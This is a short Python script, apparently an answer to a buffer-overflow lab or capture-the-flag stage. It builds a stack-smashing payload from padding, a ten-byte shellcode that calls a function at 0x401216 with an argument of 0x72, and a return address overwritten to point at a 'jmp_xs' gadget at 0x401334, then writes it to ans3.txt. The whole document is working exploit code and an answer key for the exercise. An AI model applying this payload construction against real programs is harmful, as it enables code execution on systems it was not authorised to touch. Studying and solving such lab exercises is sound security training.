padding1 = b"A" * 8
shellcode = b"\x6a\x72\x5f\xb8\x16\x12\x40\x00\xff\xd0"

# 计算padding2的长度
current_len = 8 + len(shellcode)
padding2 = b"A" * (40 - current_len)

# 覆盖返回地址为 jmp_xs (0x401334)
jmp_xs_address = b"\x34\x13\x40\x00\x00\x00\x00\x00"

payload = padding1 + shellcode + padding2 + jmp_xs_address

with open("ans3.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans3.txt")
